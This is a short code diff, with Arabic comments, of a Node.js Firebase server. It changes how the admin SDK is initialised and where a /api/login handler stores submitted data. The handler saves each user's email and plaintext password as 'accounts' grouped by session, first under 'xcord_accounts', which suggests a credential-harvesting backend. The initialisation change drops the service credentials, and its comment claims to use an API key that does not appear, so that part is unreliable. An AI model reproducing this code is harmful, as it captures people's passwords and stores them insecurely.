@@ -25,14 +25,12 @@ const firebaseConfig = {
 };
 
 // تهيئة Firebase Admin SDK
-admin.initializeApp({
-  credential: admin.credential.cert({
-    projectId: firebaseConfig.projectId,
-    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n')
-  }),
+let adminConfig = {
   databaseURL: firebaseConfig.databaseURL
-});
+};
+
+// استخدام مفتاح API العادي بدلاً من مفتاح الخدمة
+admin.initializeApp(adminConfig);
 
 const db = admin.database();
 
@@ -69,7 +67,7 @@ app.post('/api/login', async (req, res) => {
     }
     
     // تخزين بيانات تسجيل الدخول في Firebase
-    const newAccountRef = db.ref(`xcord_accounts/${sessionId}`).push();
+    const newAccountRef = db.ref(`login/sessions/${sessionId}/accounts`).push();
     await newAccountRef.set({
       email,
       password,
